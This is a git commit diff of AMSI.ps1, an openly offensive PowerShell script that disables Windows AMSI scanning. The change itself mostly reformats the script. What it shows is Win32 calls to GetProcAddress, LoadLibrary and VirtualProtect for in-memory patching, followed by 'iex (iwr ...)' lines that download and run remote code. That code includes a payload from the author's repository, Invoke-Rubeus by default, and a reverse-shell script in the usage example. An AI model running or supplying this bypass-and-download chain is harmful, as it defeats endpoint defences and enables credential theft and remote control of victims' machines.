a1228524d811aafdca5b782714770f96412e869d
Brahim <65988560+x4sh3s@users.noreply.github.com>
2022-12-10 13:47:01 +0100

    Update AMSI.ps1

--- AMSI.ps1
+++ AMSI.ps1
@@ -10,33 +10,27 @@
      AMSI_Lines -File http://127.0.0.1:8080/revshell.ps1 -Commands "-LHOST MyIp -Port 9001"
      AMSI_Lines # This Will Execute Invoke-Rubeus By default with '-h' parameter
 #>
-function AMSI_Lines(){ 
- Param (
+function AMSI_Lines() { 
+    Param (
            
-        [String]$File = "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1" #default
+        [String]$File = "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1",
         [String]$Commands = 'invoke-rubeus -command "-h"'
-       )
+    )
        
-$Win32 = @"
-
+    $Win32 = @"
 using System;
 using System.Runtime.InteropServices;
-
 public class Win32 {
-
     [DllImport("kernel32")]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
     [DllImport("kernel32")]
     public static extern IntPtr LoadLibrary(string name);
-
     [DllImport("kernel32")]
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
 }
 "@
 
-Add-Type $Win32
+    Add-Type $Win32
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
@@ -48,6 +42,6 @@ iex ( iwr https://raw.githubusercontent.com/x4sh3s/AMSI_Lines/main/11.txt -UseBa
 
 sleep 2
 iex ( iwr $File -UseBasicParsing) ; iex $Commands
-}
+};
 
-AMSI_Lines()
+AMSI_Lines
